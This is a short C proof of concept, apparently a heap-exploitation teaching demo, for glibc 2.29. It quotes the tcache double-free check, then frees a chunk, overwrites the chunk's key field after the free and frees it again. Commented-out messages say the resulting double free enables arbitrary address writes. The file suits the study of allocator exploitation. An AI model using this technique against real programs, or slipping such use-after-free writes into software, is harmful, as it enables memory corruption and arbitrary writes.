#include<stdio.h>
#include<stdlib.h>
#include<inttypes.h>
int main(int argc,char **argv)
{
    //glibc 2.29 Security Mechanism
    /*
     *if (__glibc_unlikely (e->key == tcache))
         {
           tcache_entry *tmp;
           LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
           for (tmp = tcache->entries[tc_idx]; tmp; tmp = tmp->next)
             if (tmp == e)
              malloc_printerr ("free(): double free detected in tcache 2");
           // If we get here, it was a coincidence.  We've wasted a
              few cycles, but don't abort.  
         }
     */
    //setbuf(stdout, 0);
    //setbuf(stderr, 0);
    //printf("tcache_double_free can help you achieve \"arbitrary address writes\"\n");
    void *p,*q,*r,*d;
    p = malloc(0x10);
    free(p);
    //printf("now we already free p = %p\n",p);
    //printf("we can change its key to help us achieve double free\n");
    //printf("its key = %p,now\n",*(uint64_t *)(p+8));
    //*(uint64_t *)(p + 8) = 0x122220;
    *(uint64_t *)(p + 8) = 0x1337;
    //printf("after we change,its key = %p\n",*(uint64_t *)(p+8));
    //printf("so we can achieve double free!");
    free(p);
    //printf("now we already achieve double free in glibc 2.29\n");
    return 0;
}